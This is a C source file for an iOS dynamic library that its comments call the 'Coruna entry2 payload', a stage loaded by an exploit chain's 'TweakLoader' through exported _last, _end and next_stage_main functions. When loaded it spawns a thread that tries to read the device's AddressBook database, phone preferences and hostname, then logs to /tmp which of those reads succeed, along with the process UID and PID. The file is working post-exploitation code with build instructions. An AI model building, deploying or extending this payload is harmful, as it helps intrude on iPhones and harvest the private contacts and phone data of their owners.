// nb_last.c — Coruna entry2 payload (TweakLoader contract: exports _last)
// Build: clang -target arm64e-apple-ios14.0 -dynamiclib -O2 -o nb_last.dylib nb_last.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>

static const char *OUT = "/tmp/nb_out.txt";

static int read_file(const char *path, char *buf, int cap) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    int n = (int)read(fd, buf, cap - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = 0;
    return n;
}

static void *worker(void *arg) {
    (void)arg;
    char *buf = (char *)malloc(0x20000);
    if (!buf) return NULL;

    FILE *f = fopen(OUT, "w");
    if (!f) { free(buf); return NULL; }

    const char *targets[] = {
        "/etc/hostname",
        "/private/var/mobile/Library/Preferences/com.apple.mobilephone.plist",
        "/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
        NULL
    };
    for (int i = 0; targets[i]; i++) {
        int n = read_file(targets[i], buf, 0x1FF00);
        if (n > 0) fprintf(f, "OK %s %d\n", targets[i], n);
        else       fprintf(f, "FAIL %s\n", targets[i]);
    }
    fprintf(f, "UID=%d PID=%d\n", getuid(), getpid());
    fclose(f);
    free(buf);
    return NULL;
}

// TweakLoader looks for _last (or _end) as the entry point.
int _last(void) {
    pthread_t t;
    if (pthread_create(&t, NULL, worker, NULL) == 0) pthread_detach(t);
    else worker(NULL);
    return 0;
}

int _end(void) { return _last(); }

// TweakLoader internal contract
int next_stage_main(void) { return _last(); }
